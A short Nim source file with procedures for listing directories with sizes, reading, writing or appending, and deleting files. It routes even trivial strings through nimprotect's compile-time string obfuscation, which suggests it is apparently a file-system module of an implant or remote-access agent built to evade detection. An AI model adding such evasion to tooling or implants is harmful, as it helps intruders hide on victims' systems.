import os, strutils, strformat, nimprotect


proc format_size(size: int64): string =
    const units = ["B", protectString("KB"), protectString("MB"), protectString("GB"), protectString("TB")]
    var s = size.float64
    var unitIndex = 0
    
    while s >= 1024.0 and unitIndex < units.len - 1:
        s /= 1024.0
        inc unitIndex
    
    if unitIndex == 0:
        return fmt"{size} {units[unitIndex]}"
    else:
        return fmt"{s:.1f} {units[unitIndex]}"

proc list_directory*(path: string, recurse: bool): (string, bool) =
    try:
        var items: seq[string] = @[]
        if recurse:
            for item in walkDirRec(path):
                try:
                    let info = getFileInfo(item)
                    let size = if info.kind == pcFile: format_size(info.size) else: protectString("DIR")
                    items.add(fmt"{item} ({size})")
                except:
                    items.add(fmt"{item}")
        else:
            for kind, item in walkDir(path):
                try:
                    let info = getFileInfo(item)
                    let size = if info.kind == pcFile: format_size(info.size) else: protectString("DIR")
                    items.add(fmt"{item} ({size})")
                except:
                    items.add(fmt"{item}")
        result = (items.join("\n"), true)
    except:
        result = ("", false)

proc file_read*(path: string): (string, bool) =
    try:
        result = (readFile(path).replace("\c", ""), true)
    except:
        result = ("", false)

proc file_write_or_append*(path: string, content: string, append: bool): bool =
    try:
        if append:
            writeFile(path, readFile(path) & content)
        else:
            writeFile(path, content)
        result = true
    except:
        result = false

proc file_delete*(path: string): bool =
    try:
        removeFile(path)
        result = true
    except:
        result = false

